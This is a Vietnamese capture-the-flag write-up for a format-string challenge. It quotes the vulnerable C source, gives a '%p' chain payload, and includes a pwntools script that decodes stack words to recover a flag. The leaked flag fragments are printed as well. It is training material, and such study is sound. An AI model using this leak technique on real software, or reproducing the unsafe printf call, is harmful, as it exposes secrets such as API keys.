# Stonks (Pwn — difficulty 2, CyLab id 105)

## Đề bài / file đính kèm
- Mô tả: *"I made a bot to automatically trade stonks... I wouldn't believe you if you told me it's unsecure!"* Hint: *"maybe I'd believe you if you find my API key."*
- File đính kèm: `vuln.c` (source). Remote: `nc <host> <port>`.
- Flag dùng wrapper `academy{}`.

## Recon (từ source)
```c
int buy_stonks(Portfolio *p) {
    char api_buf[FLAG_BUFFER];            // 128 byte, là BIẾN CỤC BỘ trên stack
    FILE *f = fopen("api","r");
    fgets(api_buf, FLAG_BUFFER, f);       // đọc FLAG vào api_buf
    ...
    char *user_buf = malloc(300+1);
    scanf("%300s", user_buf);
    printf(user_buf);                     // <-- FORMAT STRING
    view_portfolio(p);
}
```
- `printf(user_buf)` không có tham số ⇒ **format string** (chỉ đọc, không cần ghi).
- Flag nằm trong `api_buf` — một buffer **trên stack** của `buy_stonks`, nằm ngay trong vùng variadic argument mà `printf` đọc tới khi gặp `%p`.

## Lỗ hổng phát hiện
Format string ở `printf(user_buf)`. Vì flag đã ở trên stack, chỉ cần **đọc** nó ra: một chuỗi `%p` dài sẽ in lần lượt các "word" trên stack (mỗi word 4/8 byte), trong đó có các mảnh flag dạng ASCII (4 ký tự mỗi word, little-endian).

## Kỹ thuật khai thác
1. Chọn `1) Buy some stonks!`.
2. Tại prompt "API token?" gửi `%p.%p.%p...` (120 lần).
3. Gom tất cả `0x...`/`(nil)` → giải mã mỗi word 8 byte little-endian thành byte → tìm chuỗi ASCII dạng `...{...}`.

Các word khớp flag thu được:
```text
0x64616361 "acad"  0x7b796d65 "emy{"  0x306c5f49 "I_l0"  0x345f7435 "5t_4"
0x6d5f6c6c "ll_m"  0x306d5f79 "y_m0"  0x5f79336e "n3y_"  0x38663331 "13f8"
0x32366263 "cb62"  0xa7d       "}\n\0"
```

## Exploit script
Xem file [exploit.py](exploit.py).

```python
io.sendline(b"1")
io.recvuntil(b"API token?")
io.sendline(b".".join([b"%p"] * 120))
data = io.recvall()
buf = b"".join(int(w, 16).to_bytes(8, "little") for w in re.findall(rb"0x[0-9a-f]+", data))
print(re.search(rb"[A-Za-z0-9_]{3,}\{[ -~]+\}", buf).group(0))
```

## Flag
`academy{redacted}`

## Bài học / pattern để tái sử dụng
- **Format string chỉ-đọc (leak)**: nếu secret (flag/license/API key) nằm trong một buffer **local trên stack**, không cần `%s`/`%n` — chỉ cần dump stack bằng `%p` (hoặc `%x`/`%08x`) rồi giải mã các word little-endian và ghép ASCII. Rẻ hơn nhiều so với tính offset `%n$s`.
- Khi parse output format-string: nhớ `%p` in `(nil)` cho giá trị 0 → xử lý riêng để không lệch.
- Có source `vuln.c` ⇒ đọc thẳng layout, xác định ngay secret ở stack hay heap để chọn cách leak (stack = `%p` chain; heap = cần pointer trong slot + `%s`).
